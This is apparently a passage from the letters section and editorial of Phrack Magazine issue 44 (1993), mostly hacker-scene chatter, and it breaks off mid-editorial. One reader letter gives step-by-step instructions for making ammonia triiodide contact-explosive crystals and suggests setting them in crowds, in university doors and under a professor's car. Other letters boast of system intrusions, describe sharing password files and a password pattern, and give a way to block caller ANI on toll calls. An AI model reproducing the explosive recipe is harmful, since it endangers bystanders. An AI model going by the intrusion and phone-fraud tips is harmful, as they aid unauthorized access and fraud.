Happy Birthday to Phrack, Happy Birthday to Phrack, Happy Birthday
Happy Birthday, Happy Birthday to Phrack.  November 17th, 1993 marks
the eighth year of Phrack Magazine.  Amazing, ain&#039;t it?  Seems like
only a few years.  Makes me feel old.  Damn.

I have been a busy boy since I put out 43.  I&#039;ve been to Boston,
Amsterdam, Las Vegas, Philadelphia, and numerous points in between.
I&#039;ve been slaving at the day job, consulting and speaking about
security on the side, working on other ventures you could not
possibly conceive of without proper initiation, and piecing together
this magazine.  (Listening for applause)

It&#039;s a big pain in the butt to do a magazine like this, especially
when people who SAY they are going to write something, don&#039;t.  I know,
it&#039;s a typical hacker cop-out to start something and then get
side-tracked by other projects.  I&#039;m as guilty of that as is any of
you, but I&#039;m trying to get better.  So should those of you who are
hiding your faces in shame...you know who you are.

Every day I get bombarded with &quot;When&#039;s the next Phrack coming out?&quot;
It started the day I released 43 on IRC.  THE SAME DAY!  43 hadn&#039;t even
gone out over the mailing list yet, and people were already asking
when the next one was due out!  I know they didn&#039;t read all 1.2
megs of 43 before they started in on me.  Geez, that gets old.
For those of you who ever consider asking me such a thing, the answer
is, &quot;When it&#039;s done.&quot;

Alas, still no new corporate registrations.  A few people
have expressed an interest, but never followed through.
We have gotten a number of non-corporate registrations from
people who I guess just wanted to send me mail.  Listen
guys, I love to hear from you all, but unless you are a corporate,
federal, or law enforcement reader complying with our registration
requirements and paying the fee, you don&#039;t have to send in the form.

We&#039;ve got a few nifty things in this issue.  Phrack never really
included much more than text.  Last month&#039;s inclusion of the Novell
utilities uuencoded was a departure from the norm, and I decided to
do somthing like that again.  In this issue you will find a small
photo collection that might make you smile.

If you can&#039;t figure out how to use uudecode, I suggest
you close this file, and spend a few moments perusing the man page
entries on that command, or consulting a good book on unix.  And
for you whiners that don&#039;t have accounts on UNIX boxes, uuencode
and uudecode programs are available for DOS, Mac, Amiga and
virtually any platform you care to use.  (Although if you are using
MVS, CICS, TSO or 400/OS, you reap what you sow.)

A lot of conferences went on during the time that has passed since our
last issue.  It&#039;s nice to see that the community is making itself
a louder voice in the world, although seeing the word &quot;Cyber&quot; on
nearly every magazine in the Western Hemisphere is making me
rather nauseous, and if Billy Idol gets on another TV show (aside from
The Hollywood Squares, which would mean his career was OVER)
I may have to sell everything electronic I own.  Hell, there
was even hacking on Melrose Place.  Anyway, back to the point, as is
the case with every gathering, we&#039;ve got it covered.

You might notice that there are a lot of files dealing with people
and places rather than strictly items of hardcore technical info.
I know some may disagree with me, but I really feel that its
important to document and chronicle things that relate to the
personalities of this community.  I mean, how entertaining is it
to read &quot;HOW TO HACK TOPS-20&quot; ten years later?

Don&#039;t get me wrong and think we&#039;re not dealing with anything meaty.
This issue we&#039;ve also got operating system guides, cell &amp; bell stuff,
Van Eck info, and MORE MORE MORE.

Phrack 44.  It&#039;s out.  Now leave me alone.  :)

Hey,

Well, Im trying to set up a BBS here in small little old northeast pa, and
I&#039;m wondering if there is any way I could post the issues of phrack on it.

I&#039;ve gotten some issues from MindVOX and loved em.  Thought others would
like em.  Please send mail back.

[I have no problems with people putting copies of Phrack online
 on bbses for others to download, as long as they stay complete, and
 as long as you are not charging your users for access to download
 the files.  If you are, you are a business, and if you&#039;re planning on
 making money off of Phrack, you better email me right away.  :) ]

[Here&#039;s a plug for a nifty little &#039;zine.  It&#039;s amazing how much stuff
 someone can put out about Information Society.  Definitely a must for
 the hardcore INSoc fan.]

-------------------------------------------------------------------------------

I consider myself pretty much an &quot;individual&quot; and an &quot;end user,&quot; but
I just recently contracted with Mesa State College (of Colorado) to write a
simple computer program to organize the tool bin for the vocational
technology department.  Does this make me a computer consultation contractee
of a government, business, or organization?  Now that I think of it, the
program is designed to keep track of tools so that students don&#039;t walk off
with them, so that further makes me a &quot;SECURITY computer consultation
contractee.&quot;  Geez.  I didn&#039;t realize what an important job I had, nor how
I am part of the global conspiracy of &quot;computer professionals&quot; to rip
people off.

Hm.

What to do, what to do...  Well I guess in the spirit of Phrack magazine,
and ignoring the entirely hypocritical and pointless posturing that you have
engaged in recently, I will go ahead and read it DESPITE the very sternly
worded Copyright Warning which you have so prominently placed in file number
one.  If you feel that the information presented in Phrack 43 should be kept
from certain types of people, and if you are frustrated by the fact that these
people seem to be getting access to the information even when you have a LAW
against it...  Well.. &quot;Tough shit.&quot;

Bryce

[Bryce:

 The &quot;entirely hypocritical and pointless posturing&quot; that we have engaged
 in is to prove a point.  A point that is obviously &quot;beneath&quot; you
 as you have missed it entirely.

 Phrack has been, and always will be free.  The copyright notice
 is to ensure that Phrack is not sold by third parties.  The registration
 notice is only applicable to certain parties whose interests may be
 opposite those of Phrack Magazine.  As you probably realize, it
 is up to the INDIVIDUAL to decide whether or nor they register.  Most
 corporate/law enforcement/security officials chose not to, hence,
 they are guilty of the same thing they accuse hackers of.

 Now, this aside, I think your letter was real shitty, and you came off like
 a smarmy dickhead.  I personally could care less if you read the magazine
 or wipe your ass with it.  Its up to you.  The information is provided
 for EVERYONE to do with whatever the hell the like.

 If my attitude is contrary to what you feel is &quot;the spirit&quot; of Phrack,
 well... Tough Shit.]

Greetings,

After reading/hearing about PHRACK, 2600 and others I was pleased to
finally receive the latest issue of Phrack.  I have a few questions and
suggestions to make:

        + I have an idea for an article and would like very much to
        contribute it to Phrack.  How do I go about this?  Does the article
        have to be in any particular format?  Would it be a good idea to
        have submission details in every issue?

        + Is it possible to submit an article to both Phrack and 2600?
        Would it go against me if I did so?

        + I have heard of a zine similar to 2600, but specifically for the
        UK.  I think it might be called 2800?  Is it still going?  And how
        do I get a hold of or in touch with it?

        + With regards to your compilation of phone numbers of dialups
        to universities in the States, I have been trying for a year or
        so to compile a similar list specifically for the UK.  It has
        been a bit difficult since those lovely people at the JNT dont
        like this sort of information being compiled.  (Despite the fact
        you can probably walk into any Computer Centre at a site and pick
        up a free news letter containing such information ;-).  Anyway, if
        any UK readers would like to help me in this task, I would very
        much appreciate it.

And Keep up the good work!

[I&#039;ll handle all of this in the order you asked:

        1)  Submissions to phrack can be thru email at our well address
        phrack@well.sf.ca.us, or can be mailed via US mail to
        Phrack Magazine, 603 W. 13th #1A-278, Austin, TX, 78701.
        They don&#039;t have to be in any specific format (Style-wise) or
        on any particular type of media.  I can read almost anything
        for almost any type of computer.

        2)  You can certainly send your work to both Phrack and 2600.
        I would ask that if you do so, please indicate it to both
        myself and Emmanuel Goldstein of 2600 that you have sent it
        to both magazines.  I don&#039;t want anyone ragging on me for
        &quot;ripping of 2600&quot; by publishing something they did, as our
        schedules are about a month apart.

        3)  I have never heard of 2800.  Perhaps our readers have.

        4)  I will make sure to forward any UK dialups I get to
        you for any readers who send them in.  I do want to
        publish your list once you get it compiled though.]

I am currently in the final stages of writing my magna thesis in History
here at the University of Minnesota.  Over the past 6 months or so I have
been looking at the whole Neidorf/Riggs fiasco and have decided to do a
characterization piece about the Prophet.  Bruce Sterling
directed me towards you as someone who could give me some personal
information on Riggs (His appearance, attitude, and even obscure things
such as habits and behaviors).  From past experience, I have seen that
this information is absolutely necessary in writing these types of
&quot;unconventional&quot; histories.

Because I have never met the guy or even seen a picture of him, I must rely
on people like yourself who may have met him or may know people who have known
him.  If you can help me by directing me towards people who have known him
in the past or currently know him, it would be greatly appreciated.  I
really don&#039;t want to bother Riggs (and even if I did, I probably would not
get much out of any encounter).

Thanks in advance.

Jason W. Esser

[I&#039;m sorry, but I really can&#039;t help you in that respect.

 I would suggest you talk to Rob if you want to write about him.
 Or at a minimum Frank or Adam.  They are all very easy to contact.
 Try directory assistance.]

**He writes back**

THANKS!  You have been EXTREMELY helpful in furthering research into the
CU!  You are a man of great genius and integrity.  Jerk.

Jason W. Esser

[Jerk?

 You, a stranger, write me and want to know the details about a friend of
 mine, without even having the courtesy to let HIM know that
 you are doing such a thing?

 What would YOU think if someone out of the fucking blue phoned you
 up and asked for information about someone you knew, under the guise
 of some kind of psychological profile, and wanted to know
 what they looked like, personality quirks, etc...

 What you are doing has NO RELATIVE MERIT TO THE COMPUTER UNDERGROUND.
 In fact, I find it intrusive and repulsive.  I am not some kind of
 fucking clearing house for information about people I know.  Try
 his prosecutors for that.  Of, if you had any balls at all, you
 could call Atlanta directory assistance and get phone numbers for
 Riggs, Darden and Grant.

 Since you&#039;ve been such a dick, I suppose I&#039;ll call them myself and
 let them know that someone is trying to get personal information
 about at least one of them.  I&#039;m sure they will be thrilled.

 So, as for my great genius, you should have asked me questions about
 UNIX...you would have gotten a much more thorough reply.

 Asshole.]

I would like to make my point in e-mail that I do not wish my
program, ISS (Inet Security Scanner), to be in Phrack.

Thank you.

 about your program ISS (Inet Security Scanner), and it is not
 going to be in Phrack.]

Hello, This message desires an urgent reply-thank you

Recently a friend of mind came into some electronic trouble of sorts.  I
was wondering if it would be possible to obtain a list and an immediate
way to contact lawyer(s) who specialize in such cases.  Such as the lawyer
who represented the infamous E911 case.  As you could imagine, time is of
essence.  Thank you in advance for a quick reply.

Shadowvex...

[Depending upon where your friend is, and what he/she has done
 there are a number of people to talk to.

 If it is a case that may involve issues of constitutionality
 he should call Mike Godwin at the EFF.  (godwin@eff.org)
 Or may want to contact a local ACLU office.

 If he just wants to talk to a lawyer who MIGHT offer him some
 advice on criminal matters he could try Steve Ryan
 (blivion@zero.cypher.com)

 Craig Neidorf&#039;s lawyer probably would not be
 interested in taking such a case, unless it would pay him well
 and was in the Midwest.

 Remember, if your friend got busted hacking, lawyers aren&#039;t going
 to help much.]

I recently learned that when a prank caller calls you on a USDETEST
DIRECT telephone all you have to do is hang up the phone and then pick
it up again, then hit &#039;*57&#039; and hang up.

This logs the prank callers info into the phone company&#039;s computer
so that if he persists, they have proof of his deeds.  After 5-6 prank calls
and logging them every time, you may call the phone co. and demand that
they give you the prank caller&#039;s name, and phone number.  You may also have
the police notified of the prank caller&#039;s address, for severe cases.

After 5 logs of the activity, the phone co. is required by law to
give you the person&#039;s information.  We used it when my aunt was getting
a silent caller last month.

[I hope you know that each time you use the Call-Trace feature you
 get billed for it.  Most modern places have that feature and
 many of the other custom calling feature upgrades like caller id
 implemented now a days.]

Hey is phrack still alive?  Also, do you know the whereabouts of Full Disclosure
magazine and Hack-Tic the Dutch magazine?  If so do you have the phone number
and address to them?

Plus, do you know any other mags, that&#039;s supports hacker/computer virus (for
IBM, MAC, and AMIGA) cracker, anarchy and phreak information?  I have the 2600.
Are there others our there?

[Phrack is still alive.  Notice this response.  That should be proof.
 Hack-Tic is easily reached by mailing the editor
 rop@hacktic.nl

 Full Disclosure has no phone.
 Full Disclosure
 P.O. Box 903
 Libertyville, IL 60048

 There really aren&#039;t any other &quot;hacker&quot; mags.  Full Disclosure isn&#039;t one
 by the way.  Hack-tic is entirely in Dutch, so unless you speak Dutch
 it won&#039;t do you much good.  There are a few mags that kinda cover the whole
 net scene, like Boing Boing, Gray Areas, etc...there was a big list of cool
 magazines in the Line Noise section of Phrack 43.]

Two boys were charged with attempted murder for allegedly stuffing a
3-year-old down a Chicago high-rise building&#039;s trash chute, police said.
The boys, ages 11 and 13 were charged with aggravated battery and
attempted murder.  The 3-year-old fell six floors but his fall was
broken by a pile of trash.  He was rescued by a custodian who saw his feet
and turned off a trash compactor just before it would have crushed him,
police said.

yeah, sign me up.
thanks.

Univeristy of South Florida &lt;-- One of the easiest target that I have
ever come across... The worst security ever.  Thanks goes to Hiawatha for
some of the information.
Just to prevent any loozer from using this information I am not including
the address of this particular sight.  If you are &quot;mildly&quot; qualified you
can find the address...  Anywaz, here are some account that I have found
using the UNIX password hacker programs.  I am also including the password
file so all you bad-boyz, can use your 250,000 word dictionaries and beat
the crap out of this system.

Southern Methodist Univeristy
First of all, I must congragulate the operators of this system. There security
was &quot;almost&quot; impregnable.  With an abundance of traps.. It made attempts to
identify its callers, and if it could not identify its callers it would
disconnect.  This system was a little bit of challenge, I am again
including the password file for you&#039;ll to hack as many account as you want.
Since I don&#039;t have an abudance of accounts on this system, I will only
give you a hint on how the passwords work.
Hint:  Most password are like &lt;lastname&gt;123
Go for it guyz.

[Ok, first off, THIS IS NOT SOMETHING TO SUBMIT TO PHRACK.  This is something
 to submit to CERT.

 What the hell were you thinking?

 Anyone can get their own fucking password files man.  And beyond that,
 if you still need a password file to get into a system, then you need to
 go read a few books on tcp/ip.

 People, please don&#039;t send Phrack this kind of bullshit.  This piece of mail
 was about 250K.  It was a worthless piece of shit, and only wasted time
 and energy for everyone involved.

 And get a new handle.  Blotto would probably kick your ass for being so
 lame and having a handle so close to his.  :)  ]

A warm welcome from across the sea from myself, and I&#039;m sure on behalf of
all the other hackers/phreakers who are in Great Britain.

        After reading about HoHoCon in #42, I would really appreciate it if
you could assist me in getting hold of the following:

a) When bootleg gave his presentation he handed out a diskette containing
   information on reprogramming cellular phones... I would dearly love to
   have a copy of this information.

b) Also on the subject of HoHoCon, I would like to get in touch with Jim
   Carter, or, have a look at any notes/information that he handed out
   regarding &#039;tempest&#039; electronic eavesdropping.

Thanks, -&gt; The Operator &lt;-

[Bootleg&#039;s file is called BOOTLEG.ZIP and I&#039;m almost 98% sure that its
 somewhere on zero.cypher.com&#039;s ftp site.  If it isn&#039;t I&#039;ll try to put
 it there.

 Jim Carter is in Houston, Texas and can be reached at 713-568-8408
 or 7035 Highway 6, S. #120, Houston, TX 77083.  Jim didn&#039;t really hand
 anything out at HoHoCon, but if you were to call him, he MIGHT be able
 to direct you somewhere.  He&#039;s a good guy, but this is his JOB so don&#039;t
 expect him to give anything away.]

&#039;lo,

    I was just wondering if there&#039;s any way I can subscribe to your &#039;zine,
I can&#039;t subscribe through the method in phrack 39 because I send Internet
mail through the Cserve - Internet gateway and compuserve can&#039;t accept
messages with no subject.

   Also, I&#039;m a Canadian Hacker who&#039;s just starting out, and since pretty much
all the Hacking BBS&#039;s are in the U.S., I need to get into a Sprintnet PAD, and
an out dial, so, is there anyway to get a copy of the SprintNet directory
phrack 42 which still contains passwords? (fuck, what a leech)

{Oh yeah, I miss the explosive recipes from early issues, here&#039;s one from my
 personal collection, you can publish it if you want.}

                      AMMONIA TRIIODE CRYSTALS

     Chemicals                     Equipment
     ~~~~~~~~~                     ~~~~~~~~~

     1-Iodine Crystals             1-Funnel &amp; filter paper
                                     (coffee filters work pretty well)
     2-Clear household Ammonia
       (or pure ammonia for the
       clinically insane)          2- 2 glass jars

   Ammonia Triiode is a blackish crystal which explodes under heat inpact
producing a toxic gas which stains everything around it purple (some serious
vandalism potential here). WARNING -- be sure to use an ammonia which is
impure; crystals made with pure ammonia will explode if touched or in
sunlight!

1) Place about two teaspoons of iodine into one of the glass jars and add
enough ammonia to completely cover the crystals.

2) Put the paper into the funnel and place the funnel over the other jar.

3) Let the iodine soak in the ammonia for a few minutes (5) and then filter
the solution into the other jar.

4) Take the purplish crystals from the filter paper and dry them on a piece of
paper towel, separating them into smallish pieces. (you&#039;ll probably want to
dry them in a cool, dark place which would look good painted a blackish purple,
in case the crystals detonate)

8) After the crystals dry gently place each piece onto a square of tape
(opaque duct tape or, electrician&#039;s tape work best) and put a piece of tape
over them. _GENTLY_ press the tape together _AROUND_ the crystal.

   Once made the crystals will last a week. When detonated they produce a
bang and a cloud of gas but no flame. In other words, their perfect for
putting on the ground in crowds, in the hinges of your University&#039;s doors,
in front of the wheels of your favorite professor&#039;s car etc.

                                                      /&gt;ragline

[Ahhh, sweet destruction.  Listen, recipes like this one are very DANGEROUS.
 Do not attempt to do this.  Phrack will take no responsibility for any
 damages or injuries resulting from anyone constructing the above.

 About the SprintNet scan...Phrack doesn&#039;t publish passwords.  If you
 were any kind of hacker at all, you would enjoy trying to get them yourself.
 Does your mommie still tuck you in to bed too?

 About subscribing through CompuServe, I don&#039;t know what you may have read
 in the past, but Phrack has many CompuServe subscribers.  Try requesting
 a subscription.  Everything should work out fine.]

Excuse me for the awful list (I am on many others BBS too !!!!) and
note the my handle is usually _/ane but my real Identity/Handle is
PLiNi0 iL VeCCHi0 and the Location I used to write is GReeNiSLaND (because
the second-name that usually identify the Island of Ischia where I live
with my parents: Ischia is a island located in middle Naples&#039;s Bay near
the Island of Capri)... so I like to be called as
PLiNi0 iL VeCCHi0 / uNiTeD PHReHaCKeRS oF GReeNiSLaND  or best -u-.-P-.-G-

My best works come in Unix Environment on BSD 4.x , Ultrix , SunOs and
Multimax of Encore Corporation: I hacked the Italtel Network, the National
Council of Research best known in Italy as C.N.R. or CNR, and many host
at University of Naples, Rome, Salerno and Venice... Starting by Italtel
Telematica in Milan I was at point of hack the HQ of AT&amp;T in Bruxelles
because many users of Italtel Telematica in Milan worked in AT&amp;T too...
but to get some examination at University (Like Fisics II and Cibernetica)
I must abandon this k()()l work (but I&#039;m interested to restart at AT&amp;T).

So in the -= Phrack 42 =- I read this as follow:

/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/

In the same number of Phrack Magazine I read about TheNewHacker in North Italy
(in Torino) that was interested to get in contact with hackers. Ok, maybe I
was a little hacker, but I stay in South Italy ( I am located in Island of
Ischia, near Napoli, U know !!!)... Anyway if U can give my E-mail address to
TheNewHacker and give me the E-mail of TheNewHacker I will be so glad too...
I was interested in contributing to write for a compilation file on the hacking
scenes in Italy and France too (I have a friend that works at MATRA-ESPACE
for ESA best known as European Spazial Agency located in Toulouse). So lemme
known if I can help Your Magazine with my contributions and/or my work.

A last thing ....
        can You, Dear Erik Bloodaxe, give me some Internet address of BBS or
        FTP Sites with Underground Stuff or any kind of other K()()l stuff ?!
        (P.S. Can I get Phrack Magazine via FTP at any sites ?!??!)

[Hey man, Thanks a lot for the BBS list.  I don&#039;t really call BBSes much, but
 I&#039;m sure our readers will get a lot of use out of them!

 About writing files, GO FOR IT!  We always need files.  Feel free to send us
 anything you have written and want to publish!

 I will forward your info on to TheNewHacker in Italy.  Maybe you two can
 take Italy by storm.  Haha!

 Phrack&#039;s FTP site is ftp.netsys.com.  All issues can be found there.
 also zero.cypher.com has a lot of files for ftp.]

Hi.  I&#039;ve been spending all my free time reading through phreaker files and
all of the old Phracks.  And, I was wondering if you are still there???

If so, I need your help!  Here&#039;s the story:

On August 3, 1993 I was indicted on charges that my company attempted to rip
AT&amp;T off of nearly $2MM in 1991.  They say we started a 900# and went around
the country calling it from Pay Telephones.

They say that we went to a truck stop in Oregon and called the number 43,000+
times racking up an $800,000+ phone bill.

They claim that computers were probably used, although I have seen no
evidence of that.

These pay telephones are those AT&amp;T Black Phones; you know, the ones in the
airports.   They are owned by AT&amp;T, built by AT&amp;T, designed by AT&amp;T, and even
billed to AT&amp;T.

The evidence consists of nothing more than ANI reports.  Some phone bills to
back them up, but for the majority of it, they are using only ANI.  Now, we
all know that any can be blocked by having the operator get you a call.  And
it can be changed by dialing 0, having her get you 1-800-321-0288, then
having the toll free call be made.  In some areas, 900 calls
slipped through that way, but it would be pretty hard to do 43,000 times.

My point is, there are probably flaws with ANI.  Someone who knows what they
are doing may possibly be able to block or change ANI.  Or maybe these calls
were never put through.  Maybe someone got into the CO, etc...

What I need is someone who has knowledge of possible flaws with AT&amp;T&#039;s
theory.  Enough that could give reasonable doubt and appear as an expert
witness or point out where we could find someone.

If you know of someone who might be able to help, please respond.  My
INTERNET ID is NOFRIENDS@AOL.COM or I have set up a FAX @ 1-800-572-4403.

Remaining,
  NOFRIENDS


[43000?  Like a 43 and 3 zeros?  Jesus.  That&#039;s a lot of calls.  I really
 don&#039;t understand how they can be charging you with something hey say
 was done from a payphone.  Do they have pictures of you at the phone
 making the calls?  Sounds like a load of crap and any lawyer should be
 able to get the charges dropped based on such flimsy evidence.

 As far as there being a problem with ANI, I don&#039;t think that&#039;s an issue.
 I&#039;ve never heard of anything like this happening in the past, but there
 always could be a first time.  Something is obviously amiss, but my gut
 reaction is that the Phone Company is lying about there being such records.

 Get a lawyer and demand the records be turned over during discovery.  Then
 maybe you can see what you are up against.  GET A LAWYER!@#]

Hi, I&#039;d like to subscribe to Phrack and all upcoming issues (44+). Thanks.
BTW, when is 44 scheduled for?

Ciao,

PS: My board carries all PHRACK issues. I have around 4000 *quality* text
files on my system. It&#039;s called operation prometheus at 514-735-4340. do you
think you could post a small ad. for it in your magazine? We have FTP
access/150 Usenet news/Internet accounts for members, ect.. (2 nodes at 14,400

Hey, if you are having problems with people breaking the registration
agreement as outlined in your last couple issues of Phrack. i may be able
to help, and then I may not. My neighbor is a good friend, and fraud
investigator. She is aware of my hobbies one of which involves Phrack. She
thinks it is really neat what I am able to do with computers / modem. I am
speaking somewhat candidly here but I am sure that you are smart enough to
get my point. Well she handles some stuff like the David Koresh thing
and helping the ATF/FBI with other cases. She likes the stuff that is too
complicated for the FBI, all in all she does the investigating and puts it
into words that the FBI, ATF, USDJ, SS, Dept of Treasury/IRS can
understand, so they can make an arrest. All in all what i am trying to say
is I may be able to pass the word on down the line to her about these
people breaking the copyright law now effective on Phrack magazine. If you
would like my help on this subject, just for the simple fact she loves to
do this stuff, and phrack is a regularly read magazine by myself. If you
would like maybe something can be done to these hypocrites that value laws,
and get people arrested for the same stuff that they are currently doing
by not registering Phrack. Just let me know if you want to try to push it.
I will get together w/ her and see what can be done. Hopefully she will
just ask for names and get an investigation started. Never can tell tho.

[I hope to God that I never have to go through the legal nightmare of
 trying to prove financial damages incurred by companies &quot;pirating&quot; phrack.

 It would be somewhat interesting to use some big company as an example, and
 embarrass everyone into submission, but I keep hoping that people will just
 be HONEST.  Fuck, I may be a hacker, but I&#039;m honest about it.

 &quot;Chris, have you broken into other people&#039;s computers?&quot;
 &quot;Yes, yes I have.&quot;

 &quot;Company, do your people read Phrack without registering your subscriptions?&quot;
 &quot;Uh, well, no, we used to read Phrack, uh, but we don&#039;t anymore.&quot;

 You all suck.  You know who you are.  How can you live with yourselves?]

Hi Chris....

Was thinking...seeing as you guys are in texas, how about an article on
EDSNET ??

(There are dialups down here to it, via INFONET)

[If EDSNET is what I think it is, didn&#039;t it used to be called Pac*It Plus?

 I had a scan of it a LOOOONG time ago when everyone used it to call
 altger and tchh.  If anyone has a scan of it, or wants to do one, please
 send it to Phrack!]

Thought you guys at Phrack might be interested in this small phile, if you
don&#039;t already have it.  It&#039;s simply a form letter to the FBI requesting
all information they on file about you under the Freedom of Information
Act and Privacy Act.  They MUST respond, by law, or they face legal
penalties.  Traditionally what they do is ignore your request unless they
think you have enough money to go to court (i.e, you work for the New York
Times or something).

Gentlemen:

This is a request under the provisions of both the Privacy Act
(5 USC 552b) and the Freedom of Information Act (5 USC 522).
This request is being made under both Acts.

I hereby request one copy of any and all records about me or
referencing me maintained by the FBI.  This includes (but should
not be limited to) documents, reports, memoranda, letters,
electronic files, database references, &quot;do not file&quot; files,
photographs, audio tapes, videotapes, electronic or photographic
surveillance, &quot;june mail&quot;, mail covers, and other miscellaneous
files, and index citations relating to me or referencing me in
other files.

My full name is:  __________________________
My date of birth was:_______________________
My place of birth was:______________________
My social security number is:________________
I have lived in these places:__________________________________
_______________________________________________________________

Other names, places, events, organizations, or other references
under which you may find applicable
records:_________________________________________________________
_________________________________________________________________

As you know, FOIA/PA regulations provide that even if some
requested material is properly exempt from mandatory disclosure,
all segregable portions must be released.  If the requested
material is released with deletions, I ask that each deletion be
marked to indicate the exemption(s) being claimed to authorize
each particular withholding.  In addition, I ask that your
agency exercise its discretion to release any records which may
be technically exempt, but where withholding serves no important
public interest.

I hereby agree to pay reasonable costs associated with this
request up to a maximum of $25 without my additional approval.
However, I strongly request a fee waiver because this is, in
part, a Privacy Act request.

This letter and my signature have been certified by a notary
public as marked below.

Sincerely,

[Anyone who thinks they might be suspected of something might want to
 fill this out.  Its not a bad idea.  If YOU DON&#039;T think you are under
 some kind of investigation, you probably shouldn&#039;t.  No reason to give
 them any leads.]

         &quot;We at Phrack welcome constructive criticism, but at least
          have the nerve to email directly, rather than hide behind
          an anonymous remailer.  That way, someone could have
          responded to you in a more direct and expeditious manner.&quot;

While I agree with your general analysis of the intelligence of that
reader, I have to take exception to your disparaging of the anonymous service.
The anonymous service takes flak from many people constantly, but usually it
is from reactionary establishment types, and it&#039;s not what I expect
from phrack.

Anonymous communications have many purposes other than the sender lacking
&quot;nerve&quot;.  The &quot;the only reason to use anon mail is because you are a coward
and can&#039;t stand up for what you say&quot; argument sounds remarkably similar to
the &quot;the only reason to use cryptography is because you are a criminal and
have something to hide&quot; argument.

No doubt many criminals use cryptography and no doubt many spineless cowards
use anon mail, but to disparage someone for using anon mail is similar to
disparaging someone for using cryptography: even if it is in this case
accurate, it spreads the misconception that there are only &quot;dishonest&quot;
reasons to use these things. As someone with great respect for privacy
that allows me to see the legitimate (and necessary to a free and
democratic society) use of both secure and private communications, and
anonymous communications, I know that this is not the case.  I will not list
legitimate uses of anonymous mail for you, because they are much the arguments
for cryptography, and no doubt you know all of these.  But a possibility is
that the person involved would have his job/professional connections
threatened if some people knew that he read Phrack and sympathized with it.
Just a possibility, but if it is not true in this case it is surely easy
to believe it is true in others.

Sure, for those of us who can easily get a million email accounts from
various places in any pseudonym we want, anonymous mail is unnecessary.
But a legitimate and secure (and respected) way to send the occasional
anonymous message is much preferable to (possibly illegal) deception and fraud.

So, in short, even though the reader in question may indeed have been a
spineless coward (not to mention whining nitwit), to insult him for his
use of the anonymous server is harmful to the cause of anonymous mail,
a cause which has few supporters and many disparagers, and a cause which
the operators of the anonymous server in Finland should be commended for.
Secure anonymous mail (which really doesn&#039;t quite exist yet, actually),
like secure encryption, is something necessary and good for a free
society and, and should not be disparaged.

[Yes, you are 100% right.  I really didn&#039;t mean to dis the anonymous
 mail service as a whole, I just wanted to rag on the butthead who
 sent me an anonymous piece of hate-mail.

 I personally don&#039;t use, nor have a need to use, the anonymous mailers,
 but I know a lot of people do.  They DO provide a much needed service to
 a lot of people, and you are right they should be commended on a job well
 done.

 However, if someone wants to send me some kind of shitty piece of mail,
 get a pair of balls and show yourself.  If you are so unsure of your comments
 that you need to hide, then your point must not be very valid.]

     On May 24 1992, two lone Pirates, Legacy of CyberPunk System, and Captain
Picard of Holodeck, had finally had enough of AT&amp;T.  Together, they traveled
to the AT&amp;T Maintenance Facility, just west of Goddard, Kansas, and claimed
the property in the name of Pirates and Hackers everywhere.  They hoisted the
Jolly Roger skull and crossbones high on the AT&amp;T flagpole, where it stayed
for 2 days until it was taken down by security.

This event was photographed and videotaped by dGATOBAS Productions, to
preserve this landmark in history.  And now you can witness the event.
For a limited time we are offering a 11&quot; x 17&quot; full color poster of the
Jolly Roger Pirate flag flying high over AT&amp;T, with the AT&amp;T logo in plain
view, with the caption; &quot;WE CAME, WE SAW, WE CONQUERED.&quot;

Also available, by request is a 20&quot; x 30&quot; full color poster, and a cotton

I am unhappy to say that UPi now has dropped writing the magazine from
this point on.  The reason is because Arch Bishop and myself do not have the
time to get everyone to write their articles, sort the magazine out, etc, etc.
This does not mean the group is dead, that is not true.  The group is still
alive, but all future releases will be sent to Phrack for publication but under
the UPI name.

If you want to get a list of all the current sites and members of UPI you
can finger my internet account to get the list.  If you want any of the phone
number(s) for the sites, or you have any questions or anything else to say
you can drop us a line.  Anyways I guess that&#039;s it for now.  ttyl

 thankless task.  But what the hell, I&#039;m stupid, and I have NO LIFE!  Hehe.]

                 Volume Four, Issue Forty-Four, File 2a of 27

                                   Editorial

****************************************************************************


This is going to piss people off, but hell, that&#039;s the point of having
an editorial, eh?

This issue I&#039;d like to address something running rampant in our
community:  HYPOCRACY.  I never really paid much attention to it, until
the &quot;Hacking At The End Of The Universe&quot; conference in Amsterdam.

The phrase &quot;Information Wants to be Free,&quot; almost cliche by now, was
heard screaming from nearly every speaker&#039;s mouth.  It underlie in the
tone of the whole proceedings.  Everyone was either bitching about how
this should be free, or that should be available, or it shouldn&#039;t be
illegal to do some particular act, or they were fervently offering their
support of these ideals.

Granted, Holland has a notoriously permissive and open society; and
indeed, Europe in general is far more laid back than the States, but
even many in the US hold these ideals close to heart.

One of the first things that pissed me off was the hundred guilder
entrance fee.  That&#039;s fifty dollars!  Just to get in.  On top of
that one had to pay for a tent, sleeping bag, mattress and food.  I have
no problems with paying a fee, but this was Hack-Tic charging.  One of
the biggest proponents of &quot;Information Wants to be Free!&quot;

Obviously YOUR information wants to be free, but theirs costs a hundred
guilders.

Even more shocking was the fact that nearly every session involving some
kind of &quot;technology&quot; was geared around a Hack-Tic product:  the
Demon Dialer (tm), their POCSAG demodulator, their forthcoming
spread spectrum lan adapter, or the magazine itself.  Were these free?
Were the information behind their design provided so would-be
technoweenies could run right home and break out the soldering iron?
Fuck no.  Again, Hack-Tic&#039;s information is valuable, and YOU must PAY
for the luxury of viewing it.  Unlike XYZ Corporation&#039;s information,
whose R &amp; D or Financials (which might bring someone a hefty &quot;finder&#039;s
fee&quot;) so desperately wants to be free of its magnetic bonds and spread
all the way to YOUR hard drive.

I don&#039;t want to rag on Hack-Tic too much.  I mean, throwing a conference
costs a shitload of money, and I have a GREAT deal of respect for them
for actually pulling off something so monumental.  I just want to put
things in perspective.  The major cons in America (HoHo, Scon) really don&#039;t
charge.  They &quot;ask&quot; for donations.  Sure, you might get a nasty look if
you don&#039;t cough up five or ten bucks, but hell, everyone does.  They
WANT to.  A good time is worth a handfull of change.  And there isn&#039;t
some awesome requirement just to get in the damn door.  Besides, losses
can always be made up by selling a plethora of crap such as t-shirts and
videos, which everyone always wants to buy.  (Hardware costs.  :) )

Shifting back to America:  2600.  Again, &quot;Information Wants to be Free!&quot;
E. Goldstein, huge proponent of the slogan.  Uh, do you pay five bucks
